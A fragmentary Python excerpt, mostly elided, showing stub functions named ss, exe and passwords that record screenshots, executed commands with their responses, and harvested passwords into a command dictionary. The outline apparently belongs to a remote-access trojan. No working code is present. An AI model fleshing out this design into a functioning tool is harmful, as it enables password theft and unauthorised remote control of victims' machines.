...
def ss():
    ...
    commands["ss"] = {"state": state, "imgdata": image_data}
...
def exe():
    ...
    commands["exec"] = {"command": command, "response": response}
...
def passwords():
    ...
    commands["password"] = {"state": state, "passwords": passwords}
